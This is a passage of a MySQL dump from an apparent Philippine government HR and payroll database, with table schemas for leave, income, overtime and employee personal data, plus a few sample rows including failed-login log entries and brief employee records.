INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1551', '', '2023-11-06 10:22:28', '', 'Invalid username/password. Tried with: 189', '202.90.141.177');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1552', '', '2023-11-17 13:21:08', '', 'Invalid username/password. Tried with: 189', '202.90.141.177');


#
# TABLE STRUCTURE FOR: tblempduties
#

DROP TABLE IF EXISTS `tblempduties`;

CREATE TABLE `tblempduties` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `percentWork` decimal(5,2) NOT NULL DEFAULT 0.00,
  `duties` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempexam
#

DROP TABLE IF EXISTS `tblempexam`;

CREATE TABLE `tblempexam` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `examCode` varchar(20) NOT NULL DEFAULT '',
  `examDate` date NOT NULL DEFAULT '0000-00-00',
  `examRating` decimal(4,2) NOT NULL DEFAULT 0.00,
  `examPlace` varchar(100) NOT NULL DEFAULT '',
  `licenseNumber` varchar(15) DEFAULT NULL,
  `dateRelease` date NOT NULL DEFAULT '0000-00-00',
  `ExamIndex` int(11) NOT NULL AUTO_INCREMENT,
  `verifier` varchar(50) NOT NULL,
  `reviewer` varchar(50) NOT NULL,
  PRIMARY KEY (`ExamIndex`),
  KEY `Emp_No` (`empNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempincome
#

DROP TABLE IF EXISTS `tblempincome`;

CREATE TABLE `tblempincome` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `code` int(11) NOT NULL AUTO_INCREMENT,
  `incomeCode` varchar(20) NOT NULL DEFAULT '',
  `incomeYear` year(4) NOT NULL DEFAULT 0000,
  `incomeMonth` int(11) NOT NULL DEFAULT 0,
  `actualSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `officeCode` varchar(20) NOT NULL DEFAULT '',
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ITW` decimal(10,2) NOT NULL DEFAULT 0.00,
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `zonecode` varchar(20) NOT NULL DEFAULT '',
  `netPay` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period1` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period3` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period4` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`code`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempincomeadjust
#

DROP TABLE IF EXISTS `tblempincomeadjust`;

CREATE TABLE `tblempincomeadjust` (
  `code` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incomeCode` varchar(20) NOT NULL DEFAULT '',
  `incomeMonth` varchar(10) NOT NULL DEFAULT '',
  `incomeYear` year(4) NOT NULL DEFAULT 0000,
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `type` varchar(20) NOT NULL DEFAULT '',
  `adjustSwitch` char(1) NOT NULL DEFAULT '',
  `adjustMonth` varchar(10) NOT NULL DEFAULT '0',
  `adjustYear` year(4) NOT NULL DEFAULT 0000,
  `adjustPeriod` int(11) NOT NULL DEFAULT 0,
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`code`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

INSERT INTO `tblempincomeadjust` (`code`, `empNumber`, `incomeCode`, `incomeMonth`, `incomeYear`, `incomeAmount`, `type`, `adjustSwitch`, `adjustMonth`, `adjustYear`, `adjustPeriod`, `appointmentCode`) VALUES ('1', '0008-CO0-2012', 'DIF', '7', '2016', '0.00', '1', '', '7', '2016', '1', '1');
INSERT INTO `tblempincomeadjust` (`code`, `empNumber`, `incomeCode`, `incomeMonth`, `incomeYear`, `incomeAmount`, `type`, `adjustSwitch`, `adjustMonth`, `adjustYear`, `adjustPeriod`, `appointmentCode`) VALUES ('2', '0803-CO0-2020', 'Underpay', '1', '2019', '275.00', '1', '', '01', '2019', '1', '');


#
# TABLE STRUCTURE FOR: tblempincomerata
#

DROP TABLE IF EXISTS `tblempincomerata`;

CREATE TABLE `tblempincomerata` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incRAAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `incTAAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempleave
#

DROP TABLE IF EXISTS `tblempleave`;

CREATE TABLE `tblempleave` (
  `leaveID` int(11) NOT NULL AUTO_INCREMENT,
  `dateFiled` date NOT NULL DEFAULT '0000-00-00',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `requestID` varchar(10) NOT NULL DEFAULT '',
  `leaveCode` char(3) NOT NULL DEFAULT '',
  `specificLeave` varchar(20) NOT NULL DEFAULT '',
  `reason` varchar(50) DEFAULT NULL,
  `leaveFrom` date NOT NULL DEFAULT '0000-00-00',
  `leaveTo` date NOT NULL DEFAULT '0000-00-00',
  `certifyHR` char(1) NOT NULL DEFAULT 'N',
  `approveChief` char(1) NOT NULL DEFAULT 'N',
  `approveRequest` char(1) NOT NULL DEFAULT 'N',
  `remarks` varchar(50) DEFAULT NULL,
  `inoutpatient` varchar(20) NOT NULL DEFAULT '',
  `vllocation` varchar(20) NOT NULL DEFAULT '',
  `commutation` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`leaveID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempleavebalance
#

DROP TABLE IF EXISTS `tblempleavebalance`;

CREATE TABLE `tblempleavebalance` (
  `lb_id` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '0',
  `periodMonth` int(11) NOT NULL DEFAULT 0,
  `periodYear` year(4) NOT NULL DEFAULT 0000,
  `vlEarned` decimal(6,3) NOT NULL DEFAULT 0.000,
  `trut_notimes` int(11) NOT NULL DEFAULT 0,
  `trut_totalminutes` varchar(20) NOT NULL DEFAULT '',
  `vltrut_wpay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vl_wpay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vlAbsUndWPay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vlPreBalance` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vlBalance` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vltrut_wopay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vl_wopay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vlAbsUndWoPay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `slEarned` decimal(6,3) NOT NULL DEFAULT 0.000,
  `slAbsUndWPay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `slPreBalance` decimal(6,3) NOT NULL DEFAULT 0.000,
  `slBalance` decimal(6,3) NOT NULL DEFAULT 0.000,
  `slAbsUndWoPay` decimal(6,3) NOT NULL DEFAULT 0.000,
  `vlWoPayAmount` decimal(10,0) NOT NULL DEFAULT 0,
  `slWoPayAmount` decimal(10,0) NOT NULL DEFAULT 0,
  `nodays_awol` int(11) NOT NULL DEFAULT 0,
  `nodays_absent` int(11) NOT NULL DEFAULT 0,
  `nodays_present` int(11) DEFAULT 0,
  `nodays_actualpresent` int(11) NOT NULL DEFAULT 0,
  `nodays_vl` int(11) DEFAULT 0,
  `nodays_sl` int(11) DEFAULT 0,
  `nodays_undertime` int(11) NOT NULL DEFAULT 0,
  `totalTardyHour` int(11) NOT NULL DEFAULT 0,
  `totalTardyMinute` int(11) NOT NULL DEFAULT 0,
  `setAsDeduction` char(1) NOT NULL DEFAULT '0',
  `excess` varchar(20) NOT NULL DEFAULT '0.000000',
  `off_bal` int(11) NOT NULL DEFAULT 0,
  `off_gain` int(11) NOT NULL DEFAULT 0,
  `off_used` int(11) NOT NULL DEFAULT 0,
  `flBalance` int(11) NOT NULL DEFAULT 0,
  `flPreBalance` int(11) NOT NULL DEFAULT 0,
  `plBalance` int(11) NOT NULL DEFAULT 0,
  `plPreBalance` int(11) NOT NULL DEFAULT 0,
  `mtlBalance` int(11) NOT NULL DEFAULT 0,
  `mtlPreBalance` int(11) NOT NULL DEFAULT 0,
  `ptlBalance` int(11) NOT NULL DEFAULT 0,
  `ptlPreBalance` int(11) NOT NULL DEFAULT 0,
  `stlBalance` int(11) NOT NULL DEFAULT 0,
  `stlPreBalance` int(11) NOT NULL DEFAULT 0,
  `numOfPerdiem` int(11) NOT NULL DEFAULT 0,
  `ctr_8h` int(11) NOT NULL DEFAULT 0,
  `ctr_6h` int(11) NOT NULL DEFAULT 0,
  `ctr_5h` int(11) NOT NULL DEFAULT 0,
  `ctr_4h` int(11) NOT NULL DEFAULT 0,
  `ctr_wmeal` int(11) NOT NULL DEFAULT 0,
  `ctr_diem` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ctr_laundry` int(11) NOT NULL,
  `processBy` varchar(20) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `processDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`lb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemplocalholiday
#

DROP TABLE IF EXISTS `tblemplocalholiday`;

CREATE TABLE `tblemplocalholiday` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `holidayCode` varchar(20) NOT NULL DEFAULT '',
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemplongevity
#

DROP TABLE IF EXISTS `tblemplongevity`;

CREATE TABLE `tblemplongevity` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `longiDate` date NOT NULL DEFAULT '0000-00-00',
  `longiAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `longiPercent` int(11) NOT NULL DEFAULT 0,
  `longiPay` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempmealdetails
#

DROP TABLE IF EXISTS `tblempmealdetails`;

CREATE TABLE `tblempmealdetails` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incomeCode` varchar(12) NOT NULL DEFAULT '',
  `mealAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `incomeYear` year(4) NOT NULL DEFAULT 0000,
  `incomeMonth` int(11) NOT NULL DEFAULT 0,
  `noOfDays` int(11) NOT NULL DEFAULT 0,
  `datesCovered` text NOT NULL,
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempmeeting
#

DROP TABLE IF EXISTS `tblempmeeting`;

CREATE TABLE `tblempmeeting` (
  `meetingID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `dateFiled` date NOT NULL DEFAULT '0000-00-00',
  `meetingTitle` text NOT NULL,
  `meetingDate` date NOT NULL DEFAULT '0000-00-00',
  PRIMARY KEY (`meetingID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempmonetization
#

DROP TABLE IF EXISTS `tblempmonetization`;

CREATE TABLE `tblempmonetization` (
  `mon_id` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `vlMonetize` decimal(5,3) NOT NULL DEFAULT 0.000,
  `slMonetize` decimal(5,3) NOT NULL DEFAULT 0.000,
  `processMonth` int(11) NOT NULL DEFAULT 0,
  `processYear` int(11) NOT NULL DEFAULT 0,
  `monetizeMonth` int(11) NOT NULL DEFAULT 0,
  `monetizeYear` year(4) NOT NULL DEFAULT 0000,
  `monetizeAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `processBy` varchar(20) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `processDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`mon_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempnetpay
#

DROP TABLE IF EXISTS `tblempnetpay`;

CREATE TABLE `tblempnetpay` (
  `periodMonth` int(11) NOT NULL DEFAULT 0,
  `periodYear` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `period1` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period3` decimal(10,2) NOT NULL DEFAULT 0.00,
  `period4` decimal(10,2) NOT NULL DEFAULT 0.00,
  UNIQUE KEY `uid` (`periodMonth`,`periodYear`,`empNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempob
#

DROP TABLE IF EXISTS `tblempob`;

CREATE TABLE `tblempob` (
  `obID` int(11) NOT NULL AUTO_INCREMENT,
  `dateFiled` date DEFAULT NULL,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `requestID` varchar(10) NOT NULL DEFAULT '',
  `obDateFrom` date DEFAULT NULL,
  `obDateTo` date DEFAULT NULL,
  `obTimeFrom` varchar(11) NOT NULL DEFAULT '00:00:00 AM',
  `obTimeTo` varchar(11) NOT NULL DEFAULT '00:00:00 AM',
  `obPlace` varchar(100) NOT NULL DEFAULT '',
  `obMeal` char(1) NOT NULL DEFAULT '',
  `purpose` text NOT NULL,
  `official` char(1) NOT NULL DEFAULT 'N',
  `approveRequest` char(1) NOT NULL DEFAULT 'N',
  `approveChief` char(1) NOT NULL DEFAULT 'N',
  `approveHR` char(1) NOT NULL DEFAULT 'N',
  `is_override` tinyint(1) NOT NULL,
  PRIMARY KEY (`obID`),
  KEY `obDateFrom` (`obDateFrom`),
  KEY `obDateTo` (`obDateTo`),
  KEY `empNumber` (`empNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempotdetails
#

DROP TABLE IF EXISTS `tblempotdetails`;

CREATE TABLE `tblempotdetails` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incomeYear` year(4) NOT NULL DEFAULT 0000,
  `incomeMonth` int(11) NOT NULL DEFAULT 0,
  `actualSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `wdNoHrs` int(11) NOT NULL DEFAULT 0,
  `wdNoMins` int(11) NOT NULL DEFAULT 0,
  `weNoHrs` int(11) NOT NULL DEFAULT 0,
  `weNoMins` int(11) NOT NULL DEFAULT 0,
  `ratePerHr` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ratePerMin` decimal(10,2) NOT NULL DEFAULT 0.00,
  `wdGrossHr` decimal(10,2) NOT NULL DEFAULT 0.00,
  `wdGrossMin` decimal(10,2) NOT NULL DEFAULT 0.00,
  `weGrossHr` decimal(10,2) NOT NULL DEFAULT 0.00,
  `weGrossMin` decimal(10,2) NOT NULL DEFAULT 0.00,
  `earnedPeriod` decimal(10,2) NOT NULL DEFAULT 0.00,
  `percent` int(11) NOT NULL DEFAULT 0,
  `ITW` decimal(10,2) NOT NULL DEFAULT 0.00,
  `adjustment` decimal(10,2) NOT NULL DEFAULT 0.00,
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempothersched
#

DROP TABLE IF EXISTS `tblempothersched`;

CREATE TABLE `tblempothersched` (
  `rec_ID` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) NOT NULL DEFAULT '0',
  `fromDate` date NOT NULL DEFAULT '0000-00-00',
  `toDate` date NOT NULL DEFAULT '0000-00-00',
  `schemeCode` varchar(5) NOT NULL DEFAULT '',
  PRIMARY KEY (`rec_ID`),
  KEY `idx_empNumber` (`empNumber`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;

INSERT INTO `tblempothersched` (`rec_ID`, `empNumber`, `fromDate`, `toDate`, `schemeCode`) VALUES ('1', '1023-CO0-1977', '2008-11-05', '2008-11-05', 'GEN');


#
# TABLE STRUCTURE FOR: tblempovertime
#

DROP TABLE IF EXISTS `tblempovertime`;

CREATE TABLE `tblempovertime` (
  `otID` int(11) NOT NULL AUTO_INCREMENT,
  `dateFiled` date NOT NULL DEFAULT '0000-00-00',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `otPurpose` text NOT NULL,
  `otOutput` text NOT NULL,
  `docNumber` varchar(15) NOT NULL DEFAULT '',
  `otDateFrom` date NOT NULL DEFAULT '0000-00-00',
  `otDateTo` date NOT NULL DEFAULT '0000-00-00',
  `otTimeFrom` varchar(11) NOT NULL DEFAULT '00:00:00 AM',
  `otTimeTo` varchar(11) NOT NULL DEFAULT '00:00:00 AM',
  PRIMARY KEY (`otID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemppersonal
#

DROP TABLE IF EXISTS `tblemppersonal`;

CREATE TABLE `tblemppersonal` (
  `empID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `surname` varchar(50) NOT NULL DEFAULT '',
  `firstname` varchar(50) NOT NULL DEFAULT '',
  `middlename` varchar(50) NOT NULL DEFAULT '',
  `middleInitial` varchar(10) DEFAULT NULL,
  `nameExtension` varchar(10) DEFAULT '',
  `salutation` varchar(15) NOT NULL,
  `sex` char(1) NOT NULL DEFAULT 'M',
  `civilStatus` varchar(20) NOT NULL DEFAULT 'Single',
  `spouse` varchar(80) NOT NULL DEFAULT '',
  `spouseSurname` varchar(80) NOT NULL,
  `spouseFirstname` varchar(80) NOT NULL,
  `spouseMiddlename` varchar(80) NOT NULL,
  `spousenameExtension` varchar(80) NOT NULL,
  `spouseWork` varchar(50) NOT NULL DEFAULT '',
  `spouseBusName` varchar(70) NOT NULL DEFAULT '',
  `spouseBusAddress` text DEFAULT NULL,
  `spouseTelephone` varchar(10) DEFAULT NULL,
  `tin` varchar(20) DEFAULT NULL,
  `citizenship` varchar(10) NOT NULL DEFAULT '',
  `dualCitizenshipType` varchar(20) NOT NULL,
  `dualCitizenshipCountryId` int(11) NOT NULL,
  `birthday` date NOT NULL DEFAULT '0000-00-00',
  `birthPlace` varchar(80) NOT NULL DEFAULT '',
  `bloodType` varchar(6) DEFAULT NULL,
  `height` decimal(5,2) NOT NULL DEFAULT 0.00,
  `weight` decimal(5,2) NOT NULL DEFAULT 0.00,
  `residentialAddress` text DEFAULT NULL,
  `lot1` varchar(10) NOT NULL,
  `street1` varchar(50) NOT NULL,
  `subdivision1` varchar(50) NOT NULL,
  `barangay1` varchar(50) NOT NULL,
  `city1` varchar(50) NOT NULL,
  `province1` varchar(50) NOT NULL,
  `zipCode1` int(11) DEFAULT NULL,
  `telephone1` varchar(20) DEFAULT NULL,
  `permanentAddress` text DEFAULT NULL,
  `lot2` varchar(10) NOT NULL,
  `street2` varchar(50) NOT NULL,
  `subdivision2` varchar(50) NOT NULL,
  `barangay2` varchar(50) NOT NULL,
  `city2` varchar(50) NOT NULL,
  `province2` varchar(50) NOT NULL,
  `zipCode2` int(11) DEFAULT NULL,
  `telephone2` varchar(20) DEFAULT NULL,
  `mobile` varchar(15) DEFAULT NULL,
  `email` varchar(30) DEFAULT NULL,
  `fatherName` varchar(80) NOT NULL DEFAULT '',
  `fatherSurname` varchar(80) NOT NULL,
  `fatherFirstname` varchar(80) NOT NULL,
  `fatherMiddlename` varchar(80) NOT NULL,
  `fathernameExtension` varchar(80) NOT NULL,
  `motherName` varchar(80) NOT NULL DEFAULT '',
  `motherSurname` varchar(80) NOT NULL,
  `motherFirstname` varchar(80) NOT NULL,
  `motherMiddlename` varchar(80) NOT NULL,
  `parentAddress` text DEFAULT NULL,
  `skills` text NOT NULL,
  `nadr` text DEFAULT NULL,
  `miao` text DEFAULT NULL,
  `relatedThird` char(1) DEFAULT NULL,
  `relatedDegreeParticularsThird` text DEFAULT NULL,
  `relatedFourth` char(1) DEFAULT NULL,
  `relatedDegreeParticulars` text DEFAULT NULL,
  `violateLaw` char(1) DEFAULT NULL,
  `violateLawParticulars` text DEFAULT NULL,
  `formallyCharged` char(1) DEFAULT NULL,
  `formallyChargedParticulars` text DEFAULT NULL,
  `adminCase` char(1) DEFAULT NULL,
  `adminCaseParticulars` text DEFAULT NULL,
  `forcedResign` char(1) DEFAULT NULL,
  `forcedResignParticulars` text DEFAULT NULL,
  `candidate` char(1) DEFAULT NULL,
  `candidateParticulars` text DEFAULT NULL,
  `campaign` char(1) NOT NULL,
  `campaignParticulars` text NOT NULL,
  `immigrant` char(1) NOT NULL,
  `immigrantParticulars` text NOT NULL,
  `indigenous` char(1) DEFAULT NULL,
  `indigenousParticulars` text DEFAULT NULL,
  `disabled` char(1) DEFAULT NULL,
  `disabledParticulars` text DEFAULT NULL,
  `soloParent` char(1) DEFAULT NULL,
  `soloParentParticulars` text DEFAULT NULL,
  `signature` varchar(50) NOT NULL DEFAULT '',
  `dateAccomplished` date DEFAULT '0000-00-00',
  `comTaxNumber` varchar(10) NOT NULL DEFAULT '',
  `issuedAt` varchar(50) DEFAULT NULL,
  `issuedOn` date NOT NULL DEFAULT '0000-00-00',
  `gsisNumber` varchar(25) DEFAULT NULL,
  `businessPartnerNumber` varchar(25) NOT NULL,
  `philHealthNumber` varchar(14) DEFAULT NULL,
  `sssNumber` varchar(20) DEFAULT '',
  `pagibigNumber` varchar(14) DEFAULT NULL,
  `AccountNum` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`empNumber`),
  KEY `Emp_No` (`empNumber`),
  KEY `empID` (`empID`),
  FULLTEXT KEY `surname` (`surname`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

INSERT INTO `tblemppersonal` (`empID`, `empNumber`, `surname`, `firstname`, `middlename`, `middleInitial`, `nameExtension`, `salutation`, `sex`, `civilStatus`, `spouse`, `spouseSurname`, `spouseFirstname`, `spouseMiddlename`, `spousenameExtension`, `spouseWork`, `spouseBusName`, `spouseBusAddress`, `spouseTelephone`, `tin`, `citizenship`, `dualCitizenshipType`, `dualCitizenshipCountryId`, `birthday`, `birthPlace`, `bloodType`, `height`, `weight`, `residentialAddress`, `lot1`, `street1`, `subdivision1`, `barangay1`, `city1`, `province1`, `zipCode1`, `telephone1`, `permanentAddress`, `lot2`, `street2`, `subdivision2`, `barangay2`, `city2`, `province2`, `zipCode2`, `telephone2`, `mobile`, `email`, `fatherName`, `fatherSurname`, `fatherFirstname`, `fatherMiddlename`, `fathernameExtension`, `motherName`, `motherSurname`, `motherFirstname`, `motherMiddlename`, `parentAddress`, `skills`, `nadr`, `miao`, `relatedThird`, `relatedDegreeParticularsThird`, `relatedFourth`, `relatedDegreeParticulars`, `violateLaw`, `violateLawParticulars`, `formallyCharged`, `formallyChargedParticulars`, `adminCase`, `adminCaseParticulars`, `forcedResign`, `forcedResignParticulars`, `candidate`, `candidateParticulars`, `campaign`, `campaignParticulars`, `immigrant`, `immigrantParticulars`, `indigenous`, `indigenousParticulars`, `disabled`, `disabledParticulars`, `soloParent`, `soloParentParticulars`, `signature`, `dateAccomplished`, `comTaxNumber`, `issuedAt`, `issuedOn`, `gsisNumber`, `businessPartnerNumber`, `philHealthNumber`, `sssNumber`, `pagibigNumber`, `AccountNum`) VALUES ('1', '1111', 'HRMIS', 'ADMIN', '', NULL, '', '', 'M', 'Single', '', '', '', '', '', '', '', NULL, NULL, NULL, '', '', '0', '0000-00-00', '', NULL, '0.00', '0.00', NULL, '', '', '', '', '', '', NULL, NULL, NULL, '', '', '', '', '', '', NULL, NULL, NULL, NULL, '', '', '', '', '', '', '', '', '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00', '', NULL, '0000-00-00', NULL, '', NULL, '', NULL, NULL);
INSERT INTO `tblemppersonal` (`empID`, `empNumber`, `surname`, `firstname`, `middlename`, `middleInitial`, `nameExtension`, `salutation`, `sex`, `civilStatus`, `spouse`, `spouseSurname`, `spouseFirstname`, `spouseMiddlename`, `spousenameExtension`, `spouseWork`, `spouseBusName`, `spouseBusAddress`, `spouseTelephone`, `tin`, `citizenship`, `dualCitizenshipType`, `dualCitizenshipCountryId`, `birthday`, `birthPlace`, `bloodType`, `height`, `weight`, `residentialAddress`, `lot1`, `street1`, `subdivision1`, `barangay1`, `city1`, `province1`, `zipCode1`, `telephone1`, `permanentAddress`, `lot2`, `street2`, `subdivision2`, `barangay2`, `city2`, `province2`, `zipCode2`, `telephone2`, `mobile`, `email`, `fatherName`, `fatherSurname`, `fatherFirstname`, `fatherMiddlename`, `fathernameExtension`, `motherName`, `motherSurname`, `motherFirstname`, `motherMiddlename`, `parentAddress`, `skills`, `nadr`, `miao`, `relatedThird`, `relatedDegreeParticularsThird`, `relatedFourth`, `relatedDegreeParticulars`, `violateLaw`, `violateLawParticulars`, `formallyCharged`, `formallyChargedParticulars`, `adminCase`, `adminCaseParticulars`, `forcedResign`, `forcedResignParticulars`, `candidate`, `candidateParticulars`, `campaign`, `campaignParticulars`, `immigrant`, `immigrantParticulars`, `indigenous`, `indigenousParticulars`, `disabled`, `disabledParticulars`, `soloParent`, `soloParentParticulars`, `signature`, `dateAccomplished`, `comTaxNumber`, `issuedAt`, `issuedOn`, `gsisNumber`, `businessPartnerNumber`, `philHealthNumber`, `sssNumber`, `pagibigNumber`, `AccountNum`) VALUES ('2', 'REP0902', 'Paano', 'Rashia Mae Deva', '', '', '', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '', '', '', '0', '0000-00-00', '', '', '0.00', '0.00', NULL, '', '', '', '', '', '', '0', '', NULL, '', '', '', '', '', '', '0', '', '', '', '', '', '', '', '', '', '', '', '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00', '', NULL, '0000-00-00', '', '', '', '', '', '');
INSERT INTO `tblemppersonal` (`empID`, `empNumber`, `surname`, `firstname`, `middlename`, `middleInitial`, `nameExtension`, `salutation`, `sex`, `civilStatus`, `spouse`, `spouseSurname`, `spouseFirstname`, `spouseMiddlename`, `spousenameExtension`, `spouseWork`, `spouseBusName`, `spouseBusAddress`, `spouseTelephone`, `tin`, `citizenship`, `dualCitizenshipType`, `dualCitizenshipCountryId`, `birthday`, `birthPlace`, `bloodType`, `height`, `weight`, `residentialAddress`, `lot1`, `street1`, `subdivision1`, `barangay1`, `city1`, `province1`, `zipCode1`, `telephone1`, `permanentAddress`, `lot2`, `street2`, `subdivision2`, `barangay2`, `city2`, `province2`, `zipCode2`, `telephone2`, `mobile`, `email`, `fatherName`, `fatherSurname`, `fatherFirstname`, `fatherMiddlename`, `fathernameExtension`, `motherName`, `motherSurname`, `motherFirstname`, `motherMiddlename`, `parentAddress`, `skills`, `nadr`, `miao`, `relatedThird`, `relatedDegreeParticularsThird`, `relatedFourth`, `relatedDegreeParticulars`, `violateLaw`, `violateLawParticulars`, `formallyCharged`, `formallyChargedParticulars`, `adminCase`, `adminCaseParticulars`, `forcedResign`, `forcedResignParticulars`, `candidate`, `candidateParticulars`, `campaign`, `campaignParticulars`, `immigrant`, `immigrantParticulars`, `indigenous`, `indigenousParticulars`, `disabled`, `disabledParticulars`, `soloParent`, `soloParentParticulars`, `signature`, `dateAccomplished`, `comTaxNumber`, `issuedAt`, `issuedOn`, `gsisNumber`, `businessPartnerNumber`, `philHealthNumber`, `sssNumber`, `pagibigNumber`, `AccountNum`) VALUES ('3', 'ROCJ1010', 'Cabaluna', 'Ruel', 'Ogao-ogao', 'O', 'Jr', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '', '', '', '0', '0000-00-00', '', '', '0.00', '0.00', NULL, '', '', '', '', '', '', '0', '', NULL, '', '', '', '', '', '', '0', '', '', '', '', '', '', '', '', '', '', '', '', NULL, '', NULL, NULL, NULL, NULL, NULL, 